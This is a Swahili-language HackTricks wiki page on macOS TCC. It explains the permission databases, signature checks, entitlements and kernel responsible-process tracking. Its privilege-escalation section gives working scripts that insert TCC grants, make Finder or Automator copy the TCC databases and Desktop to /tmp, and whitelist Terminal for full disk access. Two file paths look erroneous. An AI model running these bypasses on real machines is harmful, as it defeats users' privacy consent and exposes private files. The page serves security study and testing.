# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **Maelezo ya Msingi**

**TCC (Transparency, Consent, and Control)** ni security protocol inayolenga kudhibiti ruhusa za applications. Jukumu lake kuu ni kulinda vipengele nyeti kama vile **location services, contacts, photos, microphone, camera, accessibility, na full disk access**. Kwa kuhitaji ridhaa ya wazi ya mtumiaji kabla ya kutoa access ya app kwa vipengele hivi, TCC huimarisha faragha na udhibiti wa mtumiaji juu ya data yake.

Watumiaji hukutana na TCC applications zinapoomba access kwa vipengele vilivyolindwa. Hili huonekana kupitia prompt inayowaruhusu watumiaji **kukubali au kukataa access**. Zaidi ya hayo, TCC inaruhusu vitendo vya moja kwa moja vya mtumiaji, kama vile **kuburuta na kudondosha files kwenye application**, ili kutoa access kwa files maalum, na kuhakikisha kwamba applications zina access kwa vitu vilivyoruhusiwa wazi tu.

![Mfano wa TCC prompt](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** inashughulikiwa na **daemon** iliyoko `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` na kusanidiwa katika `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (ikisajili mach service `com.apple.tccd.system`).

Kuna **user-mode tccd** inayoendesha kwa kila mtumiaji aliyeingia, iliyofafanuliwa katika `/System/Library/LaunchAgents/com.apple.tccd.plist`, na kusajili mach services `com.apple.tccd` na `com.apple.usernotifications.delegate.com.apple.tccd`.

Hapa unaweza kuona tccd ikiendesha kama system na kama user:
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
Permissions **hurithiwa kutoka kwa** application **mzazi** na **permissions** **hufuatiliwa** kulingana na **Bundle ID** na **Developer ID**.

### TCC Databases

Allowances/denies huhifadhiwa katika TCC databases zifuatazo:

- Database ya mfumo mzima katika **`/Library/Application Support/com.apple.TCC/TCC.db`** .
- Database hii **inalindwa na SIP**, kwa hiyo ni SIP bypass pekee inayoweza kuiandikia.
- TCC database ya mtumiaji **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** kwa preferences za kila mtumiaji.
- Database hii inalindwa, kwa hiyo ni processes zilizo na TCC privileges za juu kama Full Disk Access pekee zinazoweza kuiandikia (lakini hailindwi na SIP).

> [!WARNING]
> Databases zilizotangulia pia **zinalindwa na TCC kwa access ya kusoma**. Kwa hiyo **hutaweza kusoma** TCC database ya mtumiaji wako wa kawaida isipokuwa ikiwa inatoka kwenye TCC privileged process.
>
> Hata hivyo, kumbuka kwamba process yenye privileges hizi za juu (kama **FDA** au **`kTCCServiceEndpointSecurityClient`**) itaweza kuandika kwenye TCC database ya watumiaji

- Kuna TCC database **ya tatu** katika **`/var/db/locationd/clients.plist`** inayoonyesha clients zinazoruhusiwa **kufikia location services**.
- Faili inayolindwa na SIP **`/Users/carlospolop/Downloads/REG.db`** (pia inalindwa dhidi ya access ya kusoma na TCC), ina **location** ya **TCC databases halali** zote.
- Faili inayolindwa na SIP **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (pia inalindwa dhidi ya access ya kusoma na TCC), ina permissions zaidi zilizotolewa na TCC.
- Faili inayolindwa na SIP **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (inasomeka na mtu yeyote) ni allow list ya applications zinazohitaji TCC exception.

> [!TIP]
> TCC database katika **iOS** iko katika **`/private/var/mobile/Library/TCC/TCC.db`**

> [!TIP]
> **notification center UI** inaweza kufanya **mabadiliko katika system TCC database**:
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
>
> Hata hivyo, watumiaji wanaweza **kufuta au kuuliza rules** kwa kutumia command line utility ya **`tccutil`**.

#### Kuuliza databases

{{#tabs}}
{{#tab name="user DB"}}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}

{{#tab name="system DB"}}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}
{{#endtabs}}

> [!TIP]
> Kwa kuangalia hifadhidata zote mbili, unaweza kuangalia ruhusa ambazo app imeruhusu, imekataa, au haina (itaomba ruhusa hiyo).

- **`service`** ni uwakilishi wa mfuatano wa **permission** wa TCC
- **`client`** ni **bundle ID** au **path to binary** iliyo na ruhusa hizo
- **`client_type`** huonyesha ikiwa ni Bundle Identifier(0) au absolute path(1)

<details>

<summary>Jinsi ya kutekeleza ikiwa ni absolute path</summary>

Fanya tu **`launctl load you_bin.plist`**, ukiwa na plist kama:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

- **`auth_value`** inaweza kuwa na thamani tofauti: denied(0), unknown(1), allowed(2), au limited(3).
- **`auth_reason`** inaweza kuwa na thamani zifuatazo: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
- Sehemu ya **csreq** ipo ili kuonyesha jinsi ya kuthibitisha binary itakayoendeshwa na kupewa ruhusa za TCC:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
- Kwa maelezo zaidi kuhusu **sehemu zingine** za jedwali [**angalia chapisho hili la blogu**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).<sup>[[1]](#references)</sup>

Unaweza pia kuangalia **ruhusa ambazo tayari zimetolewa** kwa apps katika `System Preferences --> Security & Privacy --> Privacy --> Files and Folders`.

> [!TIP]
> Watumiaji _wanaweza_ **kufuta au kuuliza kanuni** kwa kutumia **`tccutil`** .

#### Weka upya ruhusa za TCC
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### Ukaguzi wa Saini za TCC

**Hifadhidata** ya TCC huhifadhi **Bundle ID** ya programu, lakini pia **huhifadhi** **maelezo** kuhusu **saini** ili **kuhakikisha** App inayoomba kutumia ruhusa hiyo ndiyo sahihi.
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
> [!WARNING]
> Kwa hivyo, applications nyingine zinazotumia jina na bundle ID hiyo hiyo hazitaweza kufikia ruhusa zilizopewa applications nyingine.

### Entitlements & TCC Permissions

Apps **hazihitaji tu** **kuomba** na **kupewa access** kwa baadhi ya resources, bali pia zinahitaji **kuwa na entitlements husika**.\
Kwa mfano, **Telegram** ina entitlement `com.apple.security.device.camera` ya kuomba **access kwa camera**. **App** ambayo **haina** **entitlement** hii haitaweza **kufikia camera** (na user hataulizwa kuhusu ruhusa hizo).

Kumbuka kwamba entitlements ni faili za plist na ni sehemu ya code sig, kisha hu-hashiwa zaidi katika code sig kupitia slots maalum na zinaweza kuulizwa kwenye kernel na kernel code au kwenye user model code kwa kutumia `csops(#169)` au `csops_audittoken(#170)`.

Hata hivyo, ili apps **ziweze kufikia** **folders fulani za user**, kama vile `~/Desktop`, `~/Downloads` na `~/Documents`, **hazihitaji** kuwa na **entitlements** maalum. Mfumo utashughulikia access kwa uwazi na **kumuuliza user** inapohitajika.

- [https://newosxbook.com/ent.php](https://newosxbook.com/ent.php)

Apps za Apple **hazitazalisha prompts**. Zina **pre-granted rights** katika orodha yao ya **entitlements**, kumaanisha kwamba **hazitawahi kuonyesha popup**, wala **hazitaonekana katika TCC databases** zozote. Kwa mfano:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
Hii itazuia Calendar kuwauliza watumiaji ruhusa ya kufikia reminders, calendar na address book.

> [!TIP]
> Mbali na baadhi ya documentation rasmi kuhusu entitlements, inawezekana pia kupata **interesting information kuhusu entitlements katika** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)

Baadhi ya TCC permissions ni: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Hakuna public list inayofafanua zote, lakini unaweza kuangalia [**list of known ones**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).<sup>[[1]](#references)</sup>

### Maeneo nyeti yasiyolindwa

- $HOME (yenyewe)
- $HOME/.ssh, $HOME/.aws, n.k.
- /tmp

### User Intent / com.apple.macl

Kama ilivyotajwa awali, inawezekana **kuipa App access ya file kwa kuiburuta na kuiangusha ndani yake**. Access hii haitaainishwa katika TCC database yoyote, bali kama **extended** **attribute ya file**. Attribute hii **itahifadhi UUID** ya app iliyoruhusiwa:<sup>[[2]](#references)</sup>
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
> [!TIP]
> Inashangaza kwamba attribute ya **`com.apple.macl`** inasimamiwa na **Sandbox**, si tccd.
>
> Pia kumbuka kwamba ukihamisha file inayoruhusu UUID ya app fulani kwenye computer yako kwenda kwenye computer nyingine, kwa sababu app hiyo hiyo itakuwa na UID tofauti, haitaruhusu access kwa app hiyo.

Extended attribute `com.apple.macl` **haiwezi kufutwa** kama extended attributes nyingine kwa sababu **inalindwa na SIP**. Hata hivyo, kama [**ilivyoelezwa katika post hii**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), inawezekana ku-disable kwa **kui-zip** file, **kuifuta**, kisha **ku-unzip**.<sup>[[3]](#references)</sup>






## Mechanism ya Responsible Process ya XNU

Katika macOS/iOS, mechanism ya **responsible process** ni security feature muhimu inayotumiwa na framework ya **TCC (Transparency, Consent, and Control)** pamoja na security systems nyingine kufuatilia ni process gani inawajibika hatimaye kwa action fulani, hata kupitia chains za child processes.

TCC inapokagua permissions (kwa mfano, camera, microphone, location), si kila wakati hukagua process ya moja kwa moja inayofanya request. Badala yake, hukagua **responsible process** - kwa kawaida GUI application iliyoanzisha action hiyo, hata kama request halisi inatoka kwa helper process au daemon.

<details>
<summary>Jinsi Responsible Process Inavyowekwa</summary>

### Sehemu za Muundo wa Process

Kila process katika XNU hudumisha identifiers mbili muhimu za UUID:
```c
// From bsd/sys/proc_internal.h
struct proc {
// ...
pid_t   p_responsible_pid;          // PID of the responsible process
uint8_t p_uuid[16];                 // UUID from LC_UUID load command (self)
uint8_t p_responsible_uuid[16];     // UUID of pid responsible for this process
// ...
};
```
- **`p_uuid`**: UUID ya mchakato wenyewe (kutoka kwenye amri ya upakiaji `LC_UUID` ya binary yake ya Mach-O)
- **`p_responsible_pid`**: PID ya mchakato unaowajibika
- **`p_responsible_uuid`**: UUID ya mchakato unaowajibika (hubaki hata baada ya mchakato huo kuacha kufanya kazi)

### Jinsi Mchakato Unaowajibika Unavyowekwa

1. **Wakati wa Kuunda Mchakato (Fork)**

Mchakato mpya unapoundwa kupitia `fork()` au `posix_spawn()`, mchakato unaowajibika hurithiwa kutoka kwa parent (system call ya `exec()` hutumia tena muundo wa `proc` uliopo, kwa hiyo hatua hii hairudiwi hapo):

**Mahali**: `bsd/kern/kern_fork.c:1053`
```c
// In fork1_internal() - called during all process creation
proc_set_responsible_pid(child_proc, parent_proc->p_responsible_pid);
```
**Mambo Muhimu:**
- **Michakato ya watoto** **hurithi** `p_responsible_pid` ya mzazi
- Hii huunda **mnyororo wa uwajibikaji** kupitia safu ya michakato
- Mchakato unaowajibika kwa kawaida huelekeza kwenye application asili ya GUI

2. **Kazi Kuu: `proc_set_responsible_pid()`**

**Mahali**: `bsd/kern/kern_proc.c:4817-4831`
```c
void
proc_set_responsible_pid(proc_t target_proc, pid_t responsible_pid)
{
target_proc->p_responsible_pid = responsible_pid;

if (responsible_pid >= 0) {
proc_t responsible_proc = proc_find(responsible_pid);
if (responsible_proc != PROC_NULL) {
// Copy the responsible process's UUID for persistent identification
proc_getexecutableuuid(responsible_proc,
target_proc->p_responsible_uuid,
sizeof(target_proc->p_responsible_uuid));
proc_rele(responsible_proc);
}
}
return;
}
```
**Kazi hii hufanya nini:**
1. **Inaweka PID inayohusika** katika process lengwa
2. **Inatafuta process inayohusika** kwa kutumia `proc_find()` (inaongeza reference count)
3. **Inanakili UUID** kutoka `p_uuid` ya process inayohusika hadi `p_responsible_uuid` ya process lengwa
4. **Inaachilia reference** kwa kutumia `proc_rele()` (inapunguza reference count)

3. **Kwa nini Kuhifadhi PID na UUID Zote?**

Mbinu ya kuhifadhi zote mbili hutatua tatizo muhimu:

| Field | Purpose | Problem | Solution |
|-------|---------|---------|----------|
| `p_responsible_pid` | Kutafuta haraka process ya sasa | PID inaweza kutumika tena baada ya process kutoka | Hutumika kutafuta process iliyo hai |
| `p_responsible_uuid` | Utambulisho unaodumu | Hubaki baada ya process kusitishwa | Hutumika kwa ukaguzi wa usalama na auditing |

**Tatizo**: Ikiwa process inayohusika itatoka kabla ya child, PID inaweza kutolewa tena na kupewa process tofauti kabisa.

**Suluhisho**: UUID haibadiliki na hutambulisha kwa upekee binary mahususi iliyohusika, hata baada ya kutoka.

### Mtiririko wa Kuunda Process
```
┌─────────────────────────────────────────────────────────────┐
│ Parent Process (e.g., Safari)                               │
│ p_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81              │
│ p_responsible_pid: 1234 (points to itself)                 │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
└─────────────────────┬───────────────────────────────────────┘
│
│ fork() / posix_spawn()
▼
┌────────────────────────────┐
│ kern_fork.c:fork1_internal │
│                            │
│ proc_set_responsible_pid(  │
│   child_proc,              │
│   parent->p_responsible_pid│
│ );                         │
└────────────┬───────────────┘
│
▼
┌────────────────────────────┐
│ proc_set_responsible_pid() │
│                            │
│ 1. Set p_responsible_pid   │
│ 2. Find responsible proc   │
│ 3. Copy UUID               │
│ 4. Release reference       │
└────────────┬───────────────┘
│
▼
┌─────────────────────────────────────────────────────────────┐
│ Child Process (e.g., SafariHelper)                          │
│ p_uuid: B266C9DD-8E3F-4AAA-9F1E-71D2E3CDEF82              │
│ p_responsible_pid: 1234 (inherited from parent)            │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
│                     (copied from Safari)                    │
└─────────────────────────────────────────────────────────────┘
```
### Chanzo cha UUID: LC_UUID Load Command

UUID iliyohifadhiwa katika `p_uuid` hutoka kwenye **LC_UUID load command ya executable ya Mach-O**:

1. **Muda wa Compilation**
```bash
# When linking, the linker (ld) generates a unique UUID
$ ld -o myapp myapp.o
# Embedded in the Mach-O binary as LC_UUID load command
```
2. **Muda wa Utekelezaji**

**Mahali**: `bsd/kern/mach_loader.c:2393-2413`
```c
static load_return_t
load_uuid(struct uuid_command *uulp, char *command_end, load_result_t *result)
{
if ((uulp->cmdsize < sizeof(struct uuid_command)) ||
(((char *)uulp + sizeof(struct uuid_command)) > command_end)) {
return LOAD_BADMACHO;
}

// Extract UUID from LC_UUID load command
memcpy(&result->uuid[0], &uulp->uuid[0], sizeof(result->uuid));
return LOAD_SUCCESS;
}
```
3. **Imehifadhiwa katika Muundo wa Mchakato**

**Mahali**: `bsd/kern/kern_exec.c:2281`
```c
// After loading the Mach-O binary during exec()
proc_setexecutableuuid(p, &load_result.uuid[0]);
```
**Mahali**: `bsd/kern/kern_proc.c:1912-1915`
```c
void
proc_setexecutableuuid(proc_t p, const unsigned char *uuid)
{
memcpy(p->p_uuid, uuid, sizeof(p->p_uuid));
}
```
</details>


## TCC Privesc & Bypasses

### Insert into TCC

Iwapo wakati fulani utaweza kupata ruhusa ya kuandika kwenye database ya TCC, unaweza kutumia kitu kama hiki kuongeza ingizo (ondoa comments):

<details>

<summary>Insert into TCC example</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### TCC Payloads

Ikiwa umefanikiwa kuingia kwenye app yenye baadhi ya ruhusa za TCC, angalia ukurasa ufuatao wenye TCC payloads ili kuzitumia vibaya:


{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Apple Events

Jifunze kuhusu Apple Events katika:


{{#ref}}
macos-apple-events.md
{{#endref}}

### Automation (Finder) to FDA\*

Jina la TCC la ruhusa ya Automation ni: **`kTCCServiceAppleEvents`**\
Ruhusa hii mahususi ya TCC pia huonyesha **application inayoweza kusimamiwa** ndani ya database ya TCC (hivyo ruhusa hiyo hairuhusu kusimamia kila kitu).

**Finder** ni application ambayo **daima ina FDA** (hata kama haionekani kwenye UI), kwa hivyo ikiwa una haki za Automation juu yake, unaweza kutumia vibaya haki zake ili **kuifanya itekeleze vitendo fulani**.\
Katika hali hii app yako itahitaji ruhusa ya **`kTCCServiceAppleEvents`** juu ya **`com.apple.Finder`**.<sup>[[4]](#references)</sup>

{{#tabs}}
{{#tab name="Steal users TCC.db"}}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}

{{#tab name="Steal systems TCC.db"}}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}
{{#endtabs}}

Unaweza kutumia hii vibaya **kuandika database yako mwenyewe ya mtumiaji ya TCC**.

> [!WARNING]
> Kwa ruhusa hii utaweza **kuiomba Finder ifikie folda zilizozuiwa na TCC** na ikupe faili, lakini kwa kadiri ninavyojua **hutaweza kufanya Finder itekeleze code kiholela** ili kutumia vibaya kikamilifu ufikiaji wake wa FDA.
>
> Kwa hiyo, hutaweza kutumia vibaya uwezo kamili wa FDA.

Hii ndiyo TCC prompt ya kupata Automation privileges juu ya Finder:

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> Kumbuka kwamba kwa sababu app ya **Automator** ina ruhusa ya TCC **`kTCCServiceAppleEvents`**, inaweza **kudhibiti app yoyote**, kama vile Finder. Kwa hiyo, ukiwa na ruhusa ya kudhibiti Automator unaweza pia kudhibiti **Finder** kwa code kama iliyo hapa chini:

<details>

<summary>Pata shell ndani ya Automator</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

Hali hiyo hiyo hutokea kwa **Script Editor app,** inaweza kudhibiti Finder, lakini kwa kutumia AppleScript huwezi kuilazimisha itekeleze script.

### Automation (SE) kwenye baadhi ya TCC

**System Events inaweza kuunda Folder Actions, na Folder Actions zinaweza kufikia baadhi ya folda za TCC** (Desktop, Documents & Downloads), hivyo script kama ifuatayo inaweza kutumika kutumia vibaya tabia hii:
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### Automation (SE) + Accessibility (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**) hadi FDA\*

Automation kwenye **`System Events`** + Accessibility (**`kTCCServicePostEvent`**) inaruhusu kutuma **keystrokes** kwa processes. Kwa njia hii, unaweza kutumia vibaya Finder kubadilisha TCC.db ya watumiaji au kuipa app yoyote FDA (ingawa huenda ukaombwa password kwa hili).

Mfano wa Finder kubadilisha TCC.db ya watumiaji:
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility` to FDA\*

Angalia ukurasa huu kwa baadhi ya [**payloads za kutumia vibaya Accessibility permissions**](macos-tcc-payloads.md#accessibility) ili kufanya privesc hadi FDA\* au kuendesha keylogger, kwa mfano.

### **Endpoint Security Client to FDA**

Ikiwa una **`kTCCServiceEndpointSecurityClient`**, una FDA. Mwisho.

### System Policy SysAdmin File to FDA

**`kTCCServiceSystemPolicySysAdminFiles`** inaruhusu **kubadilisha** sifa ya **`NFSHomeDirectory`** ya mtumiaji, jambo linalobadilisha home folder yake na hivyo kuruhusu **kuzunguka TCC**.<sup>[[5]](#references)</sup>

### User TCC DB to FDA

Kupata **write permissions** kwenye database ya **user TCC** **huwezi** kujipatia **`FDA`** permissions, kwa sababu ni ile iliyo kwenye system database pekee inayoweza kutoa ruhusa hiyo.

Lakini unaweza **kujipatia** **Automation rights to Finder**, na kutumia vibaya technique ya awali ili ku-escalate hadi FDA\*.

### **FDA to TCC permissions**

**Full Disk Access** ni jina la TCC la **`kTCCServiceSystemPolicyAllFiles`**

Sidhani kama hii ni privesc halisi, lakini iwapo utaiona kuwa muhimu: Ukidhibiti program yenye FDA unaweza **kubadilisha user TCC database na kujipatia access yoyote**. Hii inaweza kuwa useful kama persistence technique iwapo unaweza kupoteza FDA permissions zako.

### **SIP Bypass to TCC Bypass**

**TCC database** ya system inalindwa na **SIP**, ndiyo maana processes zilizo na entitlements **zilizoonyeshwa** pekee ndizo zitaweza kuibadilisha. Kwa hiyo, ikiwa attacker atapata **SIP bypass** kwenye **file** (kuweza kubadilisha file iliyozuiwa na SIP), ataweza:

- **Kuondoa ulinzi** wa TCC database na kujipatia TCC permissions zote. Anaweza kutumia vibaya files hizi, kwa mfano:
- TCC systems database
- REG.db
- MDMOverrides.plist

Hata hivyo, kuna njia nyingine ya kutumia vibaya **SIP bypass hii ili kubypass TCC**: file `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` ni allow list ya applications zinazohitaji TCC exception. Kwa hiyo, ikiwa attacker anaweza **kuondoa ulinzi wa SIP** kutoka kwenye file hii na kuongeza **application yake mwenyewe**, application hiyo itaweza kubypass TCC.\
Kwa mfano, kuongeza terminal:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### TCC Bypasses


{{#ref}}
macos-tcc-bypasses/
{{#endref}}

## Marejeleo

